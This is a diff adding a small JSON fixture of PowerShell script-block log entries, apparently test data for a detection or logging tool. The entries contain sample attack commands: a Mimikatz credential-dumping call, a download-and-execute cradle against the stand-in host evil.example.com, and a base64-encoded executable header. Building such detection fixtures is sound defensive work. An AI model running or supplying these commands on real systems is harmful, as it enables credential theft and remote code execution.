@@ -1,0 +1,23 @@
+[
+  {
+    "ScriptBlockText": "Invoke-Mimikatz -Command \"privilege::debug sekurlsa::logonPasswords exit\"",
+    "ScriptBlockId": "{12345678-1234-1234-1234-123456789abc}",
+    "Path": "",
+    "MessageNumber": 1,
+    "MessageTotal": 1
+  },
+  {
+    "ScriptBlockText": "$wc = New-Object Net.WebClient; $wc.DownloadString(\"hxxp://evil.example.com/payload.ps1\") | Invoke-Expression",
+    "ScriptBlockId": "{22345678-1234-1234-1234-123456789abc}",
+    "Path": "C:\\Users\\jdoe\\Downloads\\update.ps1",
+    "MessageNumber": 1,
+    "MessageTotal": 1
+  },
+  {
+    "ScriptBlockText": "[Convert]::FromBase64String(\"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAA\")",
+    "ScriptBlockId": "{32345678-1234-1234-1234-123456789abc}",
+    "Path": "",
+    "MessageNumber": 1,
+    "MessageTotal": 1
+  }
+]
